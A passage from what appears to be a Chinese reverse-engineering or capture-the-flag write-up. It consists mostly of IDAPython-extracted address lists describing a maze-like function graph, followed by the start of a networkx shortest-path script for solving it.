None, None], [4280304, 4280624, None, None], [4280464, 4280784, None, None], [4280624, 4280944, None, None], [4280784, 4281088, None, None], [4280944, 4281248, None, None], [4281088, 4281408, None, None], [4281248, 4281568, None, None], [4281408, 4281728, None, None], [4281568, 4281888, None, None], [4281728, 4282048, None, None], [4281888, 4282208, None, None], [4282048, 4282352, None, None], [4282208, 4282512, None, None], [4282352, 4282656, None, None], [4282512, 4282816, None, None], [4282656, 4282976, None, None], [4282816, 4283136, None, None], [4282976, 4283296, None, None], [4283136, 4283456, None, None], [4283296, 4283616, None, None], [4283456, 4283776, None, None], [4283616, 4283936, None, None], [4283776, 4284096, None, None], [4283936, 4284256, None, None], [4284096, 4284416, None, None], [4284256, 4284576, None, None], [4284416, 4284736, None, None], [4284576, 4284896, None, None], [4284736, None, None, 4274480], [None, 4285216, 4286656, None], [4285056, 4285376, None, None], [4285216, 4285536, None, None], [4285376, 4285696, None, None], [4285536, 4285856, None, None], [4285696, 4286016, None, None], [4285856, 4286176, None, None], [4286016, 4286336, None, None], [4286176, 4286496, None, None], [4286336, None, None, 4274640], [None, None, 4296976, 4285056], [None, 4286976, 4297136, None], [4286816, 4287120, None, None], [4286976, 4287264, None, None], [4287120, 4287424, None, None], [4287264, 4287584, None, None], [4287424, 4287744, None, None], [4287584, 4287904, None, None], [4287744, 4288064, None, None], [4287904, 4288224, None, None], [4288064, 4288384, None, None], [4288224, 4288528, None, None], [4288384, 4288688, None, None], [4288528, 4288848, None, None], [4288688, 4288992, None, None], [4288848, 4289152, None, None], [4288992, 4289312, None, None], [4289152, 4289472, None, None], [4289312, 4289632, None, None], [4289472, 4289792, None, None], [4289632, 4289952, None, None], [4289792, 4290112, None, None], [4289952, 4290272, None, None], [4290112, 4290432, None, None], [4290272, 4290592, None, None], [4290432, 4290752, None, None], [4290592, 4290912, None, None], [4290752, 4291072, None, None], [4290912, 4291232, None, None], [4291072, 4291376, None, None], [4291232, 4291536, None, None], [4291376, 4291696, None, None], [4291536, 4291856, None, None], [4291696, 4292000, None, None], [4291856, 4292144, None, None], [4292000, 4292288, None, None], [4292144, 4292448, None, None], [4292288, 4292608, None, None], [4292448, 4292768, None, None], [4292608, 4292928, None, None], [4292768, 4293088, None, None], [4292928, 4293248, None, None], [4293088, 4293392, None, None], [4293248, 4293552, None, None], [4293392, 4293696, None, None], [4293552, 4293856, None, None], [4293696, 4294016, None, None], [4293856, 4294160, None, None], [4294016, 4294320, None, None], [4294160, 4294480, 4297296, None], [4294320, 4294640, None, None], [4294480, 4294800, None, None], [4294640, 4294944, None, None], [4294800, 4295088, None, None], [4294944, 4295232, None, None], [4295088, 4295392, None, None], [4295232, 4295552, None, None], [4295392, 4295696, None, None], [4295552, 4295856, None, None], [4295696, 4296016, None, None], [4295856, 4296176, None, None], [4296016, 4296336, None, None], [4296176, 4296496, None, None], [4296336, 4296656, None, None], [4296496, 4296816, None, None], [4296656, None, 4297424, None], [None, None, 4297584, 4286656], [None, None, 4297744, 4286816], [None, None, 4297904, 4294320], [None, None, 4299472, 4296816], [None, None, 4300720, 4296976], [None, None, 4302288, 4297136], [None, None, 4308576, 4297296], [None, 4298224, 4308720, None], [4298064, 4298384, None, None], [4298224, 4298528, None, None], [4298384, 4298688, None, None], [4298528, 4298848, None, None], [4298688, 4299008, None, None], [4298848, 4299168, None, None], [4299008, 4299312, None, None], [4299168, 4299472, None, None], [4299312, 4299632, None, 4297424], [4299472, 4299792, None, None], [4299632, 4299936, None, None], [4299792, 4300096, None, None], [4299936, 4300256, None, None], [4300096, 4300416, None, None], [4300256, 4300576, None, None], [4300416, None, None, None], [None, 4300864, None, 4297584], [4300720, 4301024, None, None], [4300864, 4301184, None, None], [4301024, 4301344, None, None], [4301184, 4301504, None, None], [4301344, 4301648, None, None], [4301504, 4301808, None, None], [4301648, 4301968, None, None], [4301808, 4302128, None, None], [4301968, 4302288, None, None], [4302128, 4302448, None, 4297744], [4302288, 4302608, None, None], [4302448, 4302768, None, None], [4302608, 4302912, None, None], [4302768, 4303072, None, None], [4302912, 4303232, None, None], [4303072, 4303392, None, None], [4303232, 4303552, None, None], [4303392, 4303712, None, None], [4303552, 4303872, None, None], [4303712, 4304032, None, None], [4303872, 4304192, None, None], [4304032, 4304352, None, None], [4304192, 4304496, None, None], [4304352, 4304656, None, None], [4304496, 4304816, None, None], [4304656, 4304976, None, None], [4304816, 4305136, None, None], [4304976, 4305296, None, None], [4305136, 4305456, None, None], [4305296, 4305616, None, None], [4305456, 4305776, None, None], [4305616, 4305936, None, None], [4305776, 4306096, None, None], [4305936, 4306256, None, None], [4306096, 4306400, None, None], [4306256, 4306560, None, None], [4306400, 4306720, None, None], [4306560, 4306880, None, None], [4306720, 4307024, None, None], [4306880, 4307184, None, None], [4307024, 4307344, None, None], [4307184, 4307504, None, None], [4307344, 4307664, None, None], [4307504, 4307808, None, None], [4307664, 4307968, None, None], [4307808, 4308128, None, None], [4307968, 4308288, None, None], [4308128, 4308448, None, None], [4308288, None, None, None], [None, None, 4308880, 4297904], [None, None, 4309040, 4298064], [None, None, 4311264, 4308576], [None, None, 4311888, 4308720], [None, 4309360, 4312336, None], [4309200, 4309520, 4312496, None], [4309360, None, 4312624, None], [None, None, 4313872, None], [None, 4309984, 4315312, None], [4309824, None, 4315472, None], [None, 4310304, 4316112, None], [4310144, 4310464, 4316272, None], [4310304, 4310624, 4316432, None], [4310464, 4310784, 4316592, None], [4310624, 4310944, 4316736, None], [4310784, 4311104, 4316896, None], [4310944, None, 4317024, None], [None, 4311424, 4317664, 4308880], [4311264, 4311584, 4317824, None], [4311424, 4311744, 4317984, None], [4311584, None, 4318112, None], [None, None, 4318752, 4309040], [None, 4312176, None, None], [4312048, 4312336, 4318896, None], [4312176, 4312496, None, 4309200], [4312336, 4312624, None, 4309360], [4312496, 4312784, None, 4309520], [4312624, 4312928, None, None], [4312784, 4313088, None, None], [4312928, 4313248, None, None], [4313088, 4313408, None, None], [4313248, 4313568, None, None], [4313408, 4313712, None, None], [4313568, 4313872, 4319056, None], [4313712, 4314032, None, 4309680], [4313872, 4314192, 4319200, None], [4314032, 4314352, None, None], [4314192, 4314512, None, None], [4314352, 4314672, None, None], [4314512, 4314832, None, None], [4314672, 4314992, None, None], [4314832, 4315152, None, None], [4314992, 4315312, 4319328, None], [4315152, 4315472, None, 4309824], [4315312, 4315632, None, 4309984], [4315472, 4315792, 4319472, None], [4315632, 4315952, None, None], [4315792, 4316112, None, None], [4315952, 4316272, None, 4310144], [4316112, 4316432, None, 4310304], [4316272, 4316592, None, 4310464], [4316432, 4316736, 4319616, 4310624], [4316592, 4316896, None, 4310784], [4316736, 4317024, None, 4310944], [4316896, 4317184, None, 4311104], [4317024, 4317344, None, None], [4317184, 4317504, None, None], [4317344, 4317664, 4319760, None], [4317504, 4317824, None, 4311264], [4317664, 4317984, None, 4311424], [4317824, 4318112, None, 4311584], [4317984, 4318272, None, 4311744], [4318112, 4318432, None, None], [4318272, 4318592, None, None], [4318432, 4318752, None, None], [4318592, None, None, 4311888], [None, None, 4319920, 4312176], [None, None, None, 4313712], [None, None, None, 4314032], [None, None, None, 4315152], [None, None, None, 4315632], [None, None, 4320080, 4316592], [None, None, 4320240, 4317504], [None, None, 4321472, 4318896], [None, None, 4321600, 4319616], [None, 4320400, 4321760, 4319760], [4320240, 4320560, None, None], [4320400, 4320720, None, None], [4320560, 4320880, None, None], [4320720, 4321024, None, None], [4320880, 4321184, None, None], [4321024, 4321344, None, None], [4321184, None, None, None], [None, None, None, 4319920], [None, None, 4321904, 4320080], [None, None, None, 4320240], [None, None, None, 4321600]]len(func_list): 788len(all_edges): 788[4198480, 4198624, 4198784, 4198944, 4199104, 4199264, 4199424, 4199584, 4199744, 4199904, 4200064, 4200224, 4200384, 4200544, 4200688, 4200848, 4201008, 4201168, 4201312, 4201456, 4201616, 4201776, 4201936, 4202096, 4202240, 4202384, 4202544, 4202704, 4202848, 4203008, 4203168, 4203328, 4203488, 4203648, 4203808, 4203968, 4204128, 4204272, 4204432, 4204592, 4204752, 4204912, 4205056, 4205216, 4205376, 4205536, 4205680, 4205824, 4205984, 4206144, 4206304, 4206448, 4206608, 4206768, 4206928, 4207088, 4207232, 4207392, 4207552, 4207712, 4207872, 4208032, 4208192, 4208352, 4208496, 4208656, 4208816, 4208960, 4209120, 4209280, 4209440, 4209600, 4209760, 4209904, 4210064, 4210224, 4210368, 4210528, 4210688, 4210832, 4210992, 4211152, 4211312, 4211472, 4211632, 4211792, 4211952, 4212112, 4212272, 4212432, 4212592, 4212752, 4212912, 4213072, 4213232, 4213392, 4213552, 4213696, 4213856, 4214016, 4214176, 4214320, 4214480, 4214640, 4214800, 4214960, 4215120, 4215280, 4215440, 4215584, 4215744, 4215904, 4216064, 4216208, 4216352, 4216512, 4216672, 4216832, 4216992, 4217136, 4217296, 4217440, 4217600, 4217760, 4217920, 4218080, 4218240, 4218400, 4218560, 4218720, 4218880, 4219040, 4219200, 4219360, 4219520, 4219680, 4219840, 4219984, 4220144, 4220304, 4220464, 4220608, 4220768, 4220928, 4221088, 4221232, 4221392, 4221552, 4221712, 4221872, 4222032, 4222192, 4222352, 4222496, 4222640, 4222800, 4222928, 4223088, 4223248, 4223408, 4223568, 4223712, 4223856, 4224016, 4224176, 4224336, 4224496, 4224656, 4224816, 4224976, 4225120, 4225264, 4225424, 4225584, 4225744, 4225888, 4226048, 4226208, 4226368, 4226528, 4226688, 4226848, 4227008, 4227168, 4227328, 4227488, 4227648, 4227808, 4227968, 4228112, 4228272, 4228416, 4228576, 4228736, 4228896, 4229056, 4229216, 4229376, 4229520, 4229680, 4229840, 4229984, 4230144, 4230288, 4230448, 4230608, 4230768, 4230928, 4231088, 4231248, 4231408, 4231568, 4231728, 4231888, 4232048, 4232208, 4232368, 4232528, 4232672, 4232832, 4232992, 4233152, 4233312, 4233472, 4233616, 4233776, 4233920, 4234080, 4234240, 4234400, 4234560, 4234720, 4234880, 4235040, 4235200, 4235328, 4235488, 4235632, 4235792, 4235952, 4236112, 4236272, 4236432, 4236576, 4236736, 4236896, 4237056, 4237216, 4237376, 4237520, 4237664, 4237824, 4237984, 4238144, 4238304, 4238464, 4238624, 4238784, 4238944, 4239104, 4239264, 4239424, 4239584, 4239744, 4239904, 4240064, 4240224, 4240368, 4240528, 4240688, 4240848, 4241008, 4241168, 4241312, 4241456, 4241616, 4241776, 4241936, 4242096, 4242256, 4242416, 4242576, 4242736, 4242896, 4243040, 4243200, 4243360, 4243504, 4243664, 4243824, 4243984, 4244144, 4244288, 4244448, 4244608, 4244768, 4244928, 4245072, 4245232, 4245392, 4245536, 4245696, 4245840, 4246000, 4246160, 4246320, 4246480, 4246640, 4246800, 4246960, 4247120, 4247280, 4247440, 4247600, 4247744, 4247904, 4248064, 4248224, 4248384, 4248544, 4248704, 4248864, 4249024, 4249184, 4249344, 4249504, 4249664, 4249824, 4249984, 4250144, 4250304, 4250464, 4250624, 4250784, 4250944, 4251088, 4251248, 4251408, 4251568, 4251712, 4251872, 4252032, 4252192, 4252336, 4252496, 4252656, 4252816, 4252976, 4253136, 4253296, 4253456, 4253616, 4253776, 4253936, 4254096, 4254240, 4254400, 4254544, 4254704, 4254848, 4255008, 4255152, 4255312, 4255472, 4255616, 4255776, 4255936, 4256080, 4256240, 4256400, 4256560, 4256704, 4256848, 4257008, 4257152, 4257312, 4257472, 4257632, 4257760, 4257920, 4258080, 4258240, 4258400, 4258544, 4258704, 4258864, 4259024, 4259184, 4259344, 4259488, 4259648, 4259808, 4259968, 4260128, 4260288, 4260448, 4260592, 4260752, 4260912, 4261072, 4261232, 4261392, 4261552, 4261712, 4261872, 4262032, 4262176, 4262320, 4262480, 4262640, 4262800, 4262960, 4263120, 4263280, 4263440, 4263600, 4263760, 4263920, 4264080, 4264240, 4264400, 4264560, 4264720, 4264880, 4265040, 4265200, 4265344, 4265504, 4265648, 4265792, 4265952, 4266112, 4266272, 4266432, 4266592, 4266752, 4266912, 4267072, 4267232, 4267392, 4267552, 4267712, 4267872, 4268032, 4268192, 4268352, 4268496, 4268656, 4268816, 4268976, 4269136, 4269296, 4269456, 4269616, 4269760, 4269920, 4270080, 4270240, 4270400, 4270560, 4270720, 4270880, 4271040, 4271184, 4271328, 4271488, 4271648, 4271808, 4271968, 4272128, 4272288, 4272448, 4272608, 4272768, 4272928, 4273088, 4273248, 4273392, 4273552, 4273696, 4273840, 4274000, 4274160, 4274320, 4274480, 4274640, 4274800, 4274960, 4275120, 4275280, 4275440, 4275584, 4275744, 4275904, 4276064, 4276208, 4276368, 4276528, 4276688, 4276848, 4277008, 4277168, 4277328, 4277488, 4277648, 4277808, 4277968, 4278128, 4278288, 4278448, 4278608, 4278768, 4278928, 4279072, 4279216, 4279376, 4279536, 4279696, 4279840, 4280000, 4280160, 4280304, 4280464, 4280624, 4280784, 4280944, 4281088, 4281248, 4281408, 4281568, 4281728, 4281888, 4282048, 4282208, 4282352, 4282512, 4282656, 4282816, 4282976, 4283136, 4283296, 4283456, 4283616, 4283776, 4283936, 4284096, 4284256, 4284416, 4284576, 4284736, 4284896, 4285056, 4285216, 4285376, 4285536, 4285696, 4285856, 4286016, 4286176, 4286336, 4286496, 4286656, 4286816, 4286976, 4287120, 4287264, 4287424, 4287584, 4287744, 4287904, 4288064, 4288224, 4288384, 4288528, 4288688, 4288848, 4288992, 4289152, 4289312, 4289472, 4289632, 4289792, 4289952, 4290112, 4290272, 4290432, 4290592, 4290752, 4290912, 4291072, 4291232, 4291376, 4291536, 4291696, 4291856, 4292000, 4292144, 4292288, 4292448, 4292608, 4292768, 4292928, 4293088, 4293248, 4293392, 4293552, 4293696, 4293856, 4294016, 4294160, 4294320, 4294480, 4294640, 4294800, 4294944, 4295088, 4295232, 4295392, 4295552, 4295696, 4295856, 4296016, 4296176, 4296336, 4296496, 4296656, 4296816, 4296976, 4297136, 4297296, 4297424, 4297584, 4297744, 4297904, 4298064, 4298224, 4298384, 4298528, 4298688, 4298848, 4299008, 4299168, 4299312, 4299472, 4299632, 4299792, 4299936, 4300096, 4300256, 4300416, 4300576, 4300720, 4300864, 4301024, 4301184, 4301344, 4301504, 4301648, 4301808, 4301968, 4302128, 4302288, 4302448, 4302608, 4302768, 4302912, 4303072, 4303232, 4303392, 4303552, 4303712, 4303872, 4304032, 4304192, 4304352, 4304496, 4304656, 4304816, 4304976, 4305136, 4305296, 4305456, 4305616, 4305776, 4305936, 4306096, 4306256, 4306400, 4306560, 4306720, 4306880, 4307024, 4307184, 4307344, 4307504, 4307664, 4307808, 4307968, 4308128, 4308288, 4308448, 4308576, 4308720, 4308880, 4309040, 4309200, 4309360, 4309520, 4309680, 4309824, 4309984, 4310144, 4310304, 4310464, 4310624, 4310784, 4310944, 4311104, 4311264, 4311424, 4311584, 4311744, 4311888, 4312048, 4312176, 4312336, 4312496, 4312624, 4312784, 4312928, 4313088, 4313248, 4313408, 4313568, 4313712, 4313872, 4314032, 4314192, 4314352, 4314512, 4314672, 4314832, 4314992, 4315152, 4315312, 4315472, 4315632, 4315792, 4315952, 4316112, 4316272, 4316432, 4316592, 4316736, 4316896, 4317024, 4317184, 4317344, 4317504, 4317664, 4317824, 4317984, 4318112, 4318272, 4318432, 4318592, 4318752, 4318896, 4319056, 4319200, 4319328, 4319472, 4319616, 4319760, 4319920, 4320080, 4320240, 4320400, 4320560, 4320720, 4320880, 4321024, 4321184, 4321344, 4321472, 4321600, 4321760, 4321904] 对于IDAPython简单函数的学习，可以参考 https://zzzzsky.com/2021/12/08/LearnIDAPython/ 至此，我们找到了所有的节点，以及每个节点对应的adsw对应的4个值，如果为None说明不通，如果不为None，说明是进入的另外一个函数，就可以构造一条边 networkx求最短路径写python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445import networkx as nximport hashliball_edges = [[None, 4198624, None, None], [4198480, None, 4198784, None], [None, None, 4207712, 4198624], [None, 4199104, 4211312, None], [4198944, 4199264, None, None], [4199104, 4199424, None, None], [4199264, 4199584, None, None], [4199424, 4199744, None, None], [4199584, 4199904, 4211472, None], [4199744, 4200064, None, None], [4199904, 4200224, None, None], [4200064, 4200384, None, None], [4200224, 4200544, None, None], [4200384, 4200688, None, None], [4200544, 4200848, None, None], [4200688, 4201008, None, None], [4200848, 4201168, None, None], [4201008, 4201312, None, None], [4201168, 4201456, None, None], [4201312, 4201616, None, None], [4201456, 4201776, None, None], [4201616, 4201936, None, None], [4201776, 4202096, None, None], [4201936, 4202240, None, None], [4202096, 4202384, None, None], [4202240, 4202544, None, None], [4202384, 4202704, None, None], [4202544, 4202848, None, None], [4202704, 4203008, None, None], [4202848, 4203168, None, None], [4203008, 4203328, None, None], [4203168, 4203488, None, None], [4203328, 4203648, None, None], [4203488, 4203808, None, None], [4203648, 4203968, None, None], [4203808, 4204128, None, None], [4203968, 4204272, None, None], [4204128, 4204432, None, None], [4204272, 4204592, None, None], [4204432, 4204752, None, None], [4204592, 4204912, None, None], [4204752, 4205056, None, None], [4204912, 4205216, None, None], [4205056, 4205376, None, None], [4205216, 4205536, None, None], [4205376, None, 4211632, None], [None, 4205824, 4211792, None], [4205680, 4205984, None, None], [4205824, 4206144, None, None], [4205984, 4206304, None, None], [4206144, 4206448, None, None], [4206304, 4206608, None, None], [4206448, 4206768, None, None], [4206608, 4206928, None, None], [4206768, 4207088, None, None], [4206928, 4207232, None, None], [4207088, 4207392, None, None], [4207232, 4207552, None, None], [4207392, None, 4211952, None], [None, 4207872, None, 4198784], [4207712, 4208032, None, None], [4207872, 4208192, None, None], [4208032, 4208352, None, None], [4208192, 4208496, None, None], [4208352, 4208656, None, None], [4208496, 4208816, None, None], [4208656, 4208960, None, None], [4208816, 4209120, 4212112, None], [4208960, 4209280, None, None], [4209120, 4209440, None, None], [4209280, 4209600, None, None], [4209440, 4209760, None, None], [4209600, 4209904, None, None], [4209760, 4210064, None, None], [4209904, 4210224, None, None], [4210064, 4210368, None, None], [4210224, 4210528, None, None], [4210368, 4210688, 4212272, None], [4210528, 4210832, None, None], [4210688, 4210992, None, None], [4210832, 4211152, None, None], [4210992, 4211312, None, None], [4211152, None, None, 4198944], [None, None, 4212432, 4199744], [None, None, 4216832, 4205536], [None, None, 4216992, 4205680], [None, None, 4217136, 4207552], [None, None, 4218240, 4208960], [None, None, 4218400, 4210528], [None, None, 4218560, 4211472], [None, 4212752, 4218720, None], [4212592, 4212912, None, None], [4212752, 4213072, None, None], [4212912, 4213232, None, None], [4213072, 4213392, None, None], [4213232, 4213552, None, None], [4213392, 4213696, None, None], [4213552, 4213856, None, None], [4213696, 4214016, None, None], [4213856, 4214176, None, None], [4214016, 4214320, None, None], [4214176, 4214480, None, None], [4214320, 4214640, None, None], [4214480, 4214800, None, None], [4214640, 4214960, None, None], [4214800, 4215120, None, None], [4214960, 4215280, None, None], [4215120, 4215440, None, None], [4215280, 4215584, None, None], [4215440, 4215744, None, None], [4215584, 4215904, None, None], [4215744, 4216064, None, None], [4215904, 4216208, None, None], [4216064, 4216352, None, None], [4216208, 4216512, None, None], [4216352, 4216672, None, None], [4216512, None, 4218880, None], [None, None, 4219040, 4211632], [None, None, 4219200, 4211792], [None, None, 4219360, 4211952], [None, 4217440, 4219520, None], [4217296, 4217600, None, None], [4217440, 4217760, None, None], [4217600, 4217920, None, None], [4217760, 4218080, None, None], [4217920, None, 4219680, None], [None, None, 4219840, 4212112], [None, None, 4219984, 4212272], [None, None, 4220144, 4212432], [None, None, 4220304, 4212592], [None, None, 4220464, 4216672], [None, None, 4220608, 4216832], [None, None, 4220768, 4216992], [None, None, 4222032, 4217136], [None, None, 4222192, 4217296], [None, None, 4222352, 4218080], [None, None, 4222496, 4218240], [None, None, 4222640, 4218400], [None, None, 4223248, 4218560], [None, None, 4223856, 4218720], [None, None, 4225584, 4218880], [None, None, 4225744, 4219040], [None, 4220928, None, 4219200], [4220768, 4221088, None, None], [4220928, 4221232, None, None], [4221088, 4221392, None, None], [4221232, 4221552, None, None], [4221392, 4221712, None, None], [4221552, 4221872, None, None], [4221712, None, 4225888, None], [None, None, 4226048, 4219360], [None, None, 4226208, 4219520], [None, None, 4226688, 4219680], [None, None, 4227008, 4219840], [None, None, 4227168, 4219984], [None, 4222928, None, None], [4222800, 4223088, None, None], [4222928, 4223248, None, None], [4223088, 4223408, None, 4220144], [4223248, 4223568, None, None], [4223408, 4223712, None, None], [4223568, None, None, None], [None, None, 4227328, 4220304], [None, 4224176, 4227488, None], [4224016, 4224336, None, None], [4224176, 4224496, None, None], [4224336, 4224656, None, None], [4224496, 4224816, None, None], [4224656, 4224976, None, None], [4224816, 4225120, None, None], [4224976, 4225264, None, None], [4225120, 4225424, None, None], [4225264, None, 4227648, None], [None, None, 4227808, 4220464], [None, None, 4227968, 4220608], [None, None, 4228112, 4221872], [None, None, 4228272, 4222032], [None, None, 4228576, 4222192], [None, 4226528, 4228736, None], [4226368, 4226688, None, None], [4226528, None, None, 4222352], [None, 4227008, 4228896, None], [4226848, None, None, 4222496], [None, None, 4229056, 4222640], [None, None, 4229680, 4223856], [None, None, 4229840, 4224016], [None, None, 4230928, 4225424], [None, None, 4231088, 4225584], [None, None, 4231248, 4225744], [None, None, 4232208, 4225888], [None, 4228416, None, 4226048], [4228272, None, 4232368, None], [None, None, 4232672, 4226208], [None, None, 4232832, 4226368], [None, None, 4232992, 4226848], [None, None, 4233152, 4227168], [None, 4229376, 4233312, None], [4229216, 4229520, None, None], [4229376, 4229680, None, None], [4229520, None, None, 4227328], [None, 4229984, None, 4227488], [4229840, 4230144, None, None], [4229984, 4230288, None, None], [4230144, 4230448, None, None], [4230288, 4230608, None, None], [4230448, 4230768, None, None], [4230608, None, 4233472, None], [None, None, 4233616, 4227648], [None, None, 4233776, 4227808], [None, None, 4233920, 4227968], [None, 4231568, 4234080, None], [4231408, 4231728, None, None], [4231568, 4231888, None, None], [4231728, 4232048, None, None], [4231888, None, 4234240, None], [None, None, 4234400, 4228112], [None, 4232528, None, 4228416], [4232368, None, 4234560, None], [None, None, 4234880, 4228576], [None, None, 4235328, 4228736], [None, None, 4235792, 4228896], [None, None, 4236576, 4229056], [None, None, 4236736, 4229216], [None, None, 4238784, 4230768], [None, None, 4238944, 4230928], [None, None, 4239104, 4231088], [None, None, 4239264, 4231248], [None, None, 4239424, 4231408], [None, None, 4239584, 4232048], [None, None, 4239744, 4232208], [None, 4234720, None, 4232528], [4234560, None, 4239904, None], [None, 4235040, None, 4232672], [4234880, 4235200, None, None], [4235040, 4235328, None, None], [4235200, None, 4240064, 4232832], [None, 4235632, 4240368, None], [4235488, 4235792, None, None], [4235632, 4235952, None, 4232992], [4235792, 4236112, None, None], [4235952, 4236272, None, None], [4236112, 4236432, None, None], [4236272, None, None, None], [None, None, 4240528, 4233152], [None, 4236896, None, 4233312], [4236736, 4237056, None, None], [4236896, 4237216, None, None], [4237056, 4237376, None, None], [4237216, 4237520, None, None], [4237376, 4237664, None, None], [4237520, 4237824, None, None], [4237664, 4237984, None, None], [4237824, 4238144, None, None], [4237984, 4238304, None, None], [4238144, 4238464, None, None], [4238304, 4238624, None, None], [4238464, 4238784, None, None], [4238624, None, None, 4233472], [None, None, 4240688, 4233616], [None, None, 4240848, 4233776], [None, None, 4241008, 4233920], [None, None, 4241168, 4234080], [None, None, 4241312, 4234240], [None, None, 4241456, 4234400], [None, None, 4241616, 4234720], [None, 4240224, None, 4235328], [4240064, 4240368, None, None], [4240224, None, None, 4235488], [None, None, 4241776, 4236576], [None, None, 4246640, 4238944], [None, None, 4246800, 4239104], [None, None, 4246960, 4239264], [None, None, 4247120, 4239424], [None, None, 4247280, 4239584], [None, None, 4247440, 4239744], [None, None, 4247904, 4239904], [None, 4241936, None, 4240528], [4241776, 4242096, None, None], [4241936, 4242256, None, None], [4242096, 4242416, None, None], [4242256, 4242576, None, None], [4242416, 4242736, None, None], [4242576, 4242896, None, None], [4242736, 4243040, None, None], [4242896, 4243200, None, None], [4243040, 4243360, None, None], [4243200, 4243504, None, None], [4243360, 4243664, None, None], [4243504, 4243824, None, None], [4243664, 4243984, None, None], [4243824, 4244144, None, None], [4243984, 4244288, None, None], [4244144, 4244448, None, None], [4244288, 4244608, None, None], [4244448, 4244768, None, None], [4244608, 4244928, None, None], [4244768, 4245072, None, None], [4244928, 4245232, None, None], [4245072, 4245392, None, None], [4245232, 4245536, None, None], [4245392, 4245696, None, None], [4245536, 4245840, None, None], [4245696, 4246000, None, None], [4245840, 4246160, None, None], [4246000, 4246320, None, None], [4246160, 4246480, None, None], [4246320, 4246640, None, None], [4246480, None, None, 4240688], [None, None, 4248064, 4240848], [None, None, 4248224, 4241008], [None, None, 4248384, 4241168], [None, None, 4248544, 4241312], [None, None, 4248704, 4241456], [None, None, 4248864, None], [None, 4247904, 4249184, None], [4247744, None, None, 4241616], [None, None, 4257312, 4246800], [None, None, 4257472, 4246960], [None, None, 4257632, 4247120], [None, None, 4257760, 4247280], [None, None, 4257920, 4247440], [None, 4249024, 4258080, 4247600], [4248864, 4249184, None, None], [4249024, None, None, 4247744], [None, 4249504, 4258240, None], [4249344, 4249664, None, None], [4249504, 4249824, None, None], [4249664, 4249984, None, None], [4249824, 4250144, None, None], [4249984, 4250304, None, None], [4250144, 4250464, None, None], [4250304, 4250624, None, None], [4250464, 4250784, None, None], [4250624, 4250944, None, None], [4250784, 4251088, None, None], [4250944, 4251248, None, None], [4251088, 4251408, None, None], [4251248, 4251568, None, None], [4251408, 4251712, None, None], [4251568, 4251872, None, None], [4251712, 4252032, None, None], [4251872, 4252192, None, None], [4252032, 4252336, None, None], [4252192, 4252496, None, None], [4252336, 4252656, None, None], [4252496, 4252816, None, None], [4252656, 4252976, None, None], [4252816, 4253136, None, None], [4252976, 4253296, None, None], [4253136, 4253456, None, None], [4253296, 4253616, None, None], [4253456, 4253776, None, None], [4253616, 4253936, None, None], [4253776, 4254096, None, None], [4253936, 4254240, None, None], [4254096, 4254400, None, None], [4254240, 4254544, None, None], [4254400, 4254704, None, None], [4254544, 4254848, None, None], [4254704, 4255008, None, None], [4254848, 4255152, None, None], [4255008, 4255312, None, None], [4255152, 4255472, None, None], [4255312, 4255616, None, None], [4255472, 4255776, None, None], [4255616, 4255936, None, None], [4255776, 4256080, None, None], [4255936, 4256240, None, None], [4256080, 4256400, None, None], [4256240, 4256560, None, None], [4256400, 4256704, None, None], [4256560, 4256848, None, None], [4256704, 4257008, None, None], [4256848, 4257152, None, None], [4257008, None, 4258400, None], [None, None, 4258544, 4248064], [None, None, 4258704, 4248224], [None, None, None, 4248384], [None, None, 4258864, 4248544], [None, None, 4259024, 4248704], [None, None, 4259184, 4248864], [None, None, 4259344, 4249344], [None, None, 4263760, 4257152], [None, None, 4263920, 4257312], [None, None, 4264080, 4257472], [None, None, 4265200, 4257760], [None, None, 4265344, 4257920], [None, None, 4265504, 4258080], [None, None, 4265648, 4258240], [None, 4259648, 4265792, None], [4259488, 4259808, None, None], [4259648, 4259968, None, None], [4259808, 4260128, None, None], [4259968, None, 4265952, None], [None, 4260448, 4266112, None], [4260288, 4260592, None, None], [4260448, 4260752, None, None], [4260592, 4260912, None, None], [4260752, 4261072, None, None], [4260912, 4261232, None, None], [4261072, 4261392, None, None], [4261232, 4261552, None, None], [4261392, 4261712, None, None], [4261552, 4261872, None, None], [4261712, 4262032, None, None], [4261872, 4262176, None, None], [4262032, 4262320, None, None], [4262176, 4262480, None, None], [4262320, 4262640, None, None], [4262480, 4262800, None, None], [4262640, 4262960, None, None], [4262800, 4263120, None, None], [4262960, 4263280, None, None], [4263120, 4263440, None, None], [4263280, 4263600, None, None], [4263440, None, 4266272, None], [None, None, 4268496, 4258400], [None, None, 4268656, 4258544], [None, 4264240, None, 4258704], [4264080, 4264400, None, None], [4264240, 4264560, None, None], [4264400, 4264720, None, None], [4264560, 4264880, None, None], [4264720, 4265040, None, None], [4264880, 4265200, None, None], [4265040, None, None, 4258864], [None, None, 4268816, 4259024], [None, None, 4268976, 4259184], [None, None, 4269136, 4259344], [None, None, 4269296, 4259488], [None, None, 4269456, 4260128], [None, None, 4269616, 4260288], [None, 4266432, None, 4263600], [4266272, 4266592, None, None], [4266432, 4266752, None, None], [4266592, 4266912, None, None], [4266752, 4267072, None, None], [4266912, 4267232, None, None], [4267072, 4267392, None, None], [4267232, 4267552, None, None], [4267392, 4267712, None, None], [4267552, 4267872, None, None], [4267712, 4268032, None, None], [4267872, 4268192, None, None], [4268032, 4268352, None, None], [4268192, 4268496, None, None], [4268352, None, None, 4263760], [None, None, 4269760, 4263920], [None, None, 4272288, 4265344], [None, None, 4272448, 4265504], [None, None, 4272608, 4265648], [None, None, 4273392, 4265792], [None, None, 4273552, 4265952], [None, None, 4273696, 4266112], [None, 4269920, None, 4268656], [4269760, 4270080, None, None], [4269920, 4270240, None, None], [4270080, 4270400, None, None], [4270240, 4270560, None, None], [4270400, 4270720, None, None], [4270560, 4270880, None, None], [4270720, 4271040, None, None], [4270880, 4271184, None, None], [4271040, 4271328, None, None], [4271184, 4271488, None, None], [4271328, 4271648, None, None], [4271488, 4271808, None, None], [4271648, 4271968, None, None], [4271808, 4272128, None, None], [4271968, 4272288, None, None], [4272128, None, None, 4268816], [None, None, 4274480, 4268976], [None, 4272768, None, 4269136], [4272608, 4272928, None, None], [4272768, 4273088, None, None], [4272928, 4273248, None, None], [4273088, 4273392, None, None], [4273248, None, None, 4269296], [None, None, 4274640, 4269456], [None, None, 4274800, 4269616], [None, 4274000, 4277808, None], [4273840, 4274160, None, None], [4274000, 4274320, None, None], [4274160, None, 4277968, None], [None, None, 4284896, 4272448], [None, None, 4286496, 4273552], [None, 4274960, None, 4273696], [4274800, 4275120, None, None], [4274960, 4275280, None, None], [4275120, 4275440, None, None], 